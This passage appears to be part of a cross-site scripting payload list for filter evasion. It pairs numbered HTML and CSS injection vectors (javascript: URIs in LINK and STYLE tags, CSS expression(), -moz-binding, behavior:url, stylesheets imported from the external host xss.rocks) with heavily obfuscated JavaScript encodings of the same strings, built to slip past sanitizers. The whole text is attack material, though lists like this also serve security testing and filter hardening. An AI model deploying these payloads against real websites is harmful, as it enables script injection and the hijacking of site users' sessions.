String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<BR SIZE="&{prompt(81)}">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(true+"")[1]+(false+[0]+"")[7]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[15]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<LINK REL="stylesheet" HREF="javascript:prompt(83);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[2]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[7]+(true+"")[1]+(true+"")[3]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+(true+"")[3]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[2]+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[7]+(true+"")[1]+(true+"")[3]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+(false+"")[3]+(+(101))["to"+String["name"]]()[1]+(true+"")[3]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(+(101))["to"+String["name"]]()[1]+(true+"")[1]+(true+"")[3]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[3]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(64)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[3]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([false]+"")[15]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([][""]+"")[2]+([false]+"")[10]+(undefined+"")[1]+([][""]+"")[4]+([false]+"")[10]+(undefined+"")[1]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(122)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<STYLE>@im\port'\ja\vasc\ript:prompt(91)';</STYLE>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(64)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG STYLE="xss:expr/*XSS-93*/ession(prompt(93))">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
exp/*<A STYLE='no\xss:noxss("*//*");
(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()
xss:ex/*XSS-97*//*/*/pression(prompt(97))'>
[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<STYLE>.XSS-99{background-image:url("javascript:prompt(99)");}</STYLE><A CLASS=XSS-99></A>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[15]+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[1]+(false+[0]+"")[7]+([false]+"")[3]+(false+"")[2]+(false+"")[1]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<STYLE type="text/css">BODY{background:url("javascript:prompt(101)")}</STYLE>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[3]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([false]+"")[15]+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<STYLE type="text/css">BODY{background:url("<javascript:prompt>('XSS-103')")}</STYLE>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([false]+"")[3]+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([false]+"")[15]+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<XSS-105 STYLE="xss:expression(prompt(105))">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+(true+"")[3]+(false+"")[3]+(false+"")[3]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<XSS-107 STYLE="behavior: url(xss.htc);">
